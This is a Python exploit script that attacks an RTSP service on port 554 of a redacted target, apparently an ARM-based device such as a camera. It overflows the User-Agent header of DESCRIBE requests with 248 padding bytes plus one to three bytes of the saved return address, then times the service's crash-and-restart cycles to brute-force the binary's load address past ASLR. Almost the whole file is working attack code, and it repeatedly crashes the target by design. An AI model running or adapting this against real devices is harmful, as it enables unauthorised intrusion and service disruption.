#!/usr/bin/env python3
"""
rtsp_partial_overwrite.py — Partial LR overwrite to find binary load region.

Key insight:
  User-Agent overflow: 248 bytes junk + 4 bytes = LR overwrite (confirmed PC_OFFSET=248)

  Full 4-byte overwrite → arbitrary address → all user-space addrs gave 2.3s FAST (SIGSEGV)
  → either ASLR or all tested addresses were wrong

  Partial 1-byte overwrite:
    Send 249 bytes → only LR[0] (LSB) changes, top 3 bytes stay from real stack!
    → new LR = (real_LR & 0xFFFFFF00) | new_byte
    → if real_LR is within RTSP binary, ALL values for new_byte jump near there → HIT!

  This CONFIRMS the binary is mapped (the full overwrites were just aimed at wrong addrs).
  More importantly: testing the 2-byte overwrite (250 bytes) with upper 2 bytes intact
  isolates the MSW of LR → tells us the binary's load region!

Phase 1: 1-byte overwrite sweep (LR[0] = various values, 4-byte aligned)
  → Any HIT confirms binary is at real_LR's upper 3 bytes

Phase 2: 2-byte overwrite sweep (LR[0:2] = 0x00XX for XX in ARM-aligned values)
  → Confirms or narrows upper bytes of LR

Phase 3: Brute-force upper 3 bytes from Phase 1 result
  → Once we know (orig_LR & 0xFFFFFF00), we know binary load address!

Run ISOLATED (no other RTSP tests).
Usage: python3 -u rtsp_partial_overwrite.py > /tmp/partial_ow_out.txt 2>&1
"""

import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554
PC_OFFSET = 248

def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False

def wait_rtsp(max_wait=120, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            e = time.time() - t0
            if e > 2: print(f"  [✓] RTSP alive ({label}) — waited {e:.0f}s", flush=True)
            return True
        time.sleep(1.5)
    print(f"  [✗] RTSP dead {max_wait}s ({label})", flush=True)
    return False

def probe(ua_payload, poll_timeout=30, label=""):
    if not wait_rtsp(60, "pre"):
        return None
    req = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/live RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: " + ua_payload + b"\r\n\r\n")
    t0 = time.time()
    try:
        s = socket.socket(); s.settimeout(8)
        s.connect((TARGET, RTSP_PORT)); s.sendall(req)
        try: s.recv(256)
        except: pass
        s.close()
    except: pass

    PROBE = b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 99\r\n\r\n"
    deadline = t0 + poll_timeout
    while time.time() < deadline:
        time.sleep(0.3)
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE)
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:
                t = time.time() - t0
                tag = "FAST" if t < 4 else ("HIT" if t < 70 else "PANIC")
                print(f"  [★] {label}  T+{t:.1f}s [{tag}]", flush=True)
                return t
        except: pass
    print(f"  [?] {label}  no restart in {poll_timeout}s", flush=True)
    return float(poll_timeout)

def classify(t):
    if t is None: return "SKIP"
    if t < 4: return "FAST"
    if t < 70: return "HIT"
    return "PANIC/DEAD"


print("=" * 70)
print("Partial LR overwrite — find binary load region")
print(f"PC_OFFSET = {PC_OFFSET}  (248 bytes junk before saved LR)")
print()
print("Phase 1: 1-byte overwrite (249 bytes total)")
print("  LR[0] changed, upper 3 bytes intact = jump near original LR")
print("  If ANY result is HIT → binary IS mapped, partial overwrite works!")
print("=" * 70)

wait_rtsp(120, "start")

# ─── Phase 1: 1-byte overwrite, sweep LR[0] in 4-byte steps ─────────────────
print()
print("[*] Phase 1: 1-byte sweep (0x00..0xFF step 4 = ARM-aligned targets)")

hits_p1 = []
for lb in range(0x00, 0x100, 4):
    payload = b'A' * PC_OFFSET + bytes([lb])  # 249 bytes total
    t = probe(payload, poll_timeout=30, label=f"1B LR[0]=0x{lb:02X}")
    cls = classify(t)
    print(f"  LR[0]=0x{lb:02X}  t={t:.1f}s  {cls}", flush=True)
    if cls == "HIT":
        hits_p1.append(lb)
        print(f"  *** HIT! binary is near LR=(upper3)|0x{lb:02X} ***", flush=True)
    wait_rtsp(60, f"after 0x{lb:02X}")

print()
print(f"Phase 1 summary: HIT on LR[0] values = {[hex(x) for x in hits_p1]}")

if not hits_p1:
    print("  No HITs — either ASLR scrambles LR every time, or NX on code pages")
    print("  Trying Thumb mode: same byte values but addr|1 (odd addresses)")
    print()
    print("[*] Phase 1b: Thumb mode (LR[0] = 0x01,0x05,...0xFD — ARM Thumb-interwork)")
    for lb in range(0x01, 0x100, 4):  # odd values = Thumb mode
        payload = b'A' * PC_OFFSET + bytes([lb])
        t = probe(payload, poll_timeout=30, label=f"1B Thumb LR[0]=0x{lb:02X}")
        cls = classify(t)
        print(f"  LR[0]=0x{lb:02X} [THM]  t={t:.1f}s  {cls}", flush=True)
        if cls == "HIT":
            hits_p1.append(lb)
            print(f"  *** HIT (Thumb)! binary at Thumb(LR)=(upper3)|0x{lb:02X} ***", flush=True)
        wait_rtsp(60, f"after Thumb 0x{lb:02X}")


# ─── Phase 2: 2-byte overwrite, narrow upper bytes ───────────────────────────
if hits_p1:
    print()
    print("=" * 70)
    print("[*] Phase 2: 2-byte overwrite — find LR[1] (upper byte of lower word)")
    print("  Keeping LR[0]=0x00, sweeping LR[1]=0x00..0xFF")
    print("  HIT → confirms 2 low bytes of LR → narrows binary address!")
    print("=" * 70)

    hits_p2 = []
    for b1 in range(0x00, 0x100, 4):
        payload = b'A' * PC_OFFSET + bytes([0x00, b1])  # 250 bytes: LR[0]=0, LR[1]=b1
        t = probe(payload, poll_timeout=30, label=f"2B LR[0:2]=0x{b1:02X}00")
        cls = classify(t)
        print(f"  LR[1]=0x{b1:02X}  t={t:.1f}s  {cls}", flush=True)
        if cls == "HIT":
            hits_p2.append(b1)
            print(f"  *** HIT! LR lower 2 bytes = 0x{b1:02X}00 ***", flush=True)
        wait_rtsp(60, f"after LR[1]=0x{b1:02X}")

    print()
    print(f"Phase 2 hits: LR[1] values = {[hex(x) for x in hits_p2]}")

    if hits_p2:
        # Phase 3: 3-byte sweep to find exact load address region
        print()
        print("=" * 70)
        print("[*] Phase 3: 3-byte overwrite — find LR[2] (3rd byte)")
        print("  LR[0]=0x00, LR[1]=hit_from_p2, sweep LR[2]=0x00..0xFF")
        print("=" * 70)

        hits_p3 = []
        b1_best = hits_p2[0]
        for b2 in range(0x00, 0x100):
            payload = b'A' * PC_OFFSET + bytes([0x00, b1_best, b2])
            t = probe(payload, poll_timeout=30, label=f"3B LR[2]=0x{b2:02X}")
            cls = classify(t)
            print(f"  LR[2]=0x{b2:02X}  t={t:.1f}s  {cls}", flush=True)
            if cls == "HIT":
                hits_p3.append(b2)
                # Load address is approx (b2 << 16) | (b1_best << 8) — byte 0 varies
                approx_addr = (b2 << 16) | (b1_best << 8)
                print(f"  *** HIT! binary likely at 0x{approx_addr:08X}xxxx ***", flush=True)
            wait_rtsp(60, f"after LR[2]=0x{b2:02X}")

        print()
        print(f"Phase 3 hits: LR[2] values = {[hex(x) for x in hits_p3]}")
        if hits_p3:
            for b2 in hits_p3:
                load_approx = (b2 << 16) | (b1_best << 8)
                print(f"  BINARY LIKELY AT: 0x{load_approx:08X} (± 256 bytes)")


print()
print("=" * 70)
print("Done.")
